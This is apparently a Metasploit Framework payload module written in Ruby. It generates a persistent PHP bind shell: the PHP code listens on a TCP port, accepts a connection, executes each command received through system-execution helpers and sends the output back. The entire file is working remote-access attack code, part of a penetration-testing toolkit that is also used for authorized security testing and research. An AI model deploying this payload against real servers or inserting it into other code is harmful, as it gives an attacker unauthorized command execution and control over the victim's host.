##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell via php (persistent)',
			'Author'        => ['egypt', 'diaul <diaul@devilopers.org>',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# PHP Bind Shell
	#
	def php_bind_shell

		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
		shell = <<-END_OF_PHP_CODE
		#{php_preamble({:disabled_varname => dis})}
		$port=#{datastore['LPORT']};

		$scl='socket_create_listen';
		if(is_callable($scl)&&!in_array($scl,#{dis})){
			$sock=@$scl($port);
		}else{
			$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
			$ret=@socket_bind($sock,0,$port);
			$ret=@socket_listen($sock,5);
		}
		$msgsock=@socket_accept($sock);
		@socket_close($sock);

		while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
		{
			
			$c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
			if(FALSE===$c){break;}
			#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
			@socket_write($msgsock,$o,strlen($o));
		}
		@socket_close($msgsock);
		END_OF_PHP_CODE
		
		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + php_bind_shell
	end

end